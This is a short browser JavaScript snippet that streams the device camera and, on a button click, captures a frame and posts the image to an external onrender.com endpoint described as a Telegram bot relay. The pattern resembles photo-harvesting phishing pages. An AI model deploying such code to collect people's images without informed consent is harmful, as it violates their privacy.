const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const snapButton = document.getElementById('snap');
const context = canvas.getContext('2d');

// Access the device camera and stream to video element
navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
        video.srcObject = stream;
    })
    .catch((err) => {
        console.error("Error accessing camera: ", err);
    });

// Capture the photo
snapButton.addEventListener('click', () => {
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageDataURL = canvas.toDataURL('image/png');
    
    // Send the image to the server or bot
    sendToTelegramBot(imageDataURL);
});

function sendToTelegramBot(imageDataURL) {
    fetch('https://magic-app-9vje.onrender.com/', {
        method: 'POST',
        body: JSON.stringify({ image: imageDataURL }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}

